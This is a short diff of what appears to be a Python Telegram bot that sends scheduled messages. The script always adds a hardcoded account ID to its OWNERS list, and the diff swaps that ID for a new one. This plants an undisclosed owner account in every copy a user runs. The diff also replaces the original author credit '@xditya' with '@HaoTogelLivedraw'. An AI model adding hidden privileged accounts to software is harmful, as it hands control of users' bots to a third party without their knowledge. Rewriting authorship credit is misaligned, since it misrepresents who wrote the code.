@@ -38,7 +38,7 @@ except Exception as e:
     exit(1)
 
 OWNERS = [int(i) for i in owonerz.split(" ")]
-OWNERS.append(719195224) if 719195224 not in OWNERS else None
+OWNERS.append(1696771874) if 1696771874 not in OWNERS else None
 MESSAGES = MSGS.split("||")
 TIMES_SENT = 1
 
@@ -105,7 +105,7 @@ log.info("Starting scheduler with a {} second gap...".format(TIME_DELAY))
 scheduler = AsyncIOScheduler()
 scheduler.add_job(send_msg, "interval", seconds=TIME_DELAY)
 scheduler.start()
-log.info("\n\nStarted.\n(c) @xditya.\n")
+log.info("\n\nStarted.\n(c) @HaoTogelLivedraw.\n")
 
 
 client.run_until_disconnected()
